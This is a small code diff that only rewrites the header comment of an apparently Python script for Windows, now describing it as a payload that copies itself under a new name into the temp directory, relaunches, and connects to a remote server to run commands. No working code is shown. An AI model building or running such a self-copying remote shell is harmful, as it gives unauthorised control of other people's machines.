@@ -1,7 +1,7 @@
 # Description - ( Windows systems ):
 
-# This script serves as the client-side counterpart to the Remote Shell server.
-# It connects to the server and allows the execution of commands.
+# Windows payload duplicates itself with a different name in the tmp directory,
+# executes the new script, and connects to a remote server for command execution.
 
 
 try:
